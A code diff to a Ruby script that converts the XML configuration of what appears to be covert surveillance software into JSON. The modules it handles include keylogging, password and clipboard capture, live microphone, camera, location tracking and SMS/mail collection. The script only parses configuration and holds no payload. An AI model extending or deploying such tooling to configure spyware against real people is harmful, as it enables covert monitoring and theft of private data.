@@ -63,6 +63,7 @@ require 'xmlsimple'
             when 'quota'
               e[:quota] = params['size'].to_i
             when 'location'
+              e[:event] = 'position'
               e[:type] = params['type']
               e[:latitude] = params['latitude'].to_f unless params['latitude'].nil?
               e[:longitude] = params['longitude'].to_f unless params['longitude'].nil?
@@ -124,8 +125,15 @@ require 'xmlsimple'
             case sub
               when 'synchronize'
                 subaction[:stop] = false
-                subaction['type'] = 'internet' if s['type'].nil?
+                # bluetooth does not exist anymore
+                next if s['type'] == 'bluetooth'
                 subaction.merge! s
+                subaction.delete('type')
+                subaction.delete('gprs')
+                subaction['wifi'] = false unless s.has_key?('wifi')
+                subaction['wifi'] = s['wifi'] == 'true' ? true : false
+                subaction['cell'] = s['gprs'] == 'true' ? true : false
+                subaction['cell'] = true if s.has_key?('apn')
               when 'sms'
                 subaction.merge! s
               when 'log'
@@ -162,8 +170,20 @@ require 'xmlsimple'
         case a[:module]
           when 'application', 'chat', 'clipboard', 'device', 'keylog', 'password', 'calllist', 'url'
             # no parameters
-          when 'call', 'camera', 'mic', 'mouse', 'position', 'print', 'snapshot', 'conference', 'livemic'
+          when 'call', 'camera', 'mouse', 'print', 'conference', 'livemic'
             a.merge! item[a[:module]].first
+          when 'snapshot'
+            a.merge! item[a[:module]].first
+            a['onlywindow'] = a['onlywindow'] == 'true' ? true : false
+          when 'mic'
+            a.merge! item[a[:module]].first
+            a['autosense'] = a['autosense'] == 'true' ? true : false
+            a['vad'] = a['vad'] == 'true' ? true : false
+          when 'position'
+            a.merge! item[a[:module]].first
+            a['gps'] = a['gps'] == 'true' ? true : false
+            a['wifi'] = a['wifi'] == 'true' ? true : false
+            a['cell'] = a['cell'] == 'true' ? true : false
           when 'crisis'
             t = item[a[:module]].first
             a[:network] = {:enabled => t['network'].first['enabled'] == 'false' ? false : true,
@@ -185,13 +205,28 @@ require 'xmlsimple'
             a.merge! item[a[:module]].first
             a['accept'] = a['accept'].first['mask'] unless a['accept'].nil?
             a['deny'] = a['deny'].first['mask'] unless a['deny'].nil?
+            a['open'] = a['open'] == 'true' ? true : false
+            a['capture'] = a['capture'] == 'true' ? true : false
           when 'messages'
             item[a[:module]].each do |mes|
               a.merge! mes
             end
-            a['sms'] = a['sms'].first unless a['sms'].nil?
-            a['mms'] = a['mms'].first unless a['mms'].nil?
-            a['mail'] = a['mail'].first unless a['mail'].nil?
+            unless a['sms'].nil?
+              a['sms'] = a['sms'].first
+              a['sms']['enabled'] = a['sms']['enabled'] == 'true' ? true : false
+              a['sms']['filter'][0]['history'] = a['sms']['filter'][0]['history'] == 'true' ? true : false
+            end
+            unless a['mms'].nil?
+              a['mms'] = a['mms'].first
+              a['mms']['enabled'] = a['mms']['enabled'] == 'true' ? true : false
+              a['mms']['filter'][0]['history'] = a['mms']['filter'][0]['history'] == 'true' ? true : false
+            end
+            unless a['mail'].nil?
+              a['mail'] = a['mail'].first
+              a['mail']['enabled'] = a['mail']['enabled'] == 'true' ? true : false
+              a['mail']['filter'][0]['history'] = a['mail']['filter'][0]['history'] == 'true' ? true : false
+            end
+
           when 'organizer'
             # we need to split this agent in two
             a[:module] = 'addressbook'
@@ -286,8 +321,8 @@ require 'xmlsimple'
       return config.to_json
     end
 
-filename = 'config_mobile'
-#filename = 'config_desktop'
+#filename = 'config_mobile'
+filename = 'config_desktop'
 content = ''
 
 File.open("#{filename}.xml", 'rb') do |f|
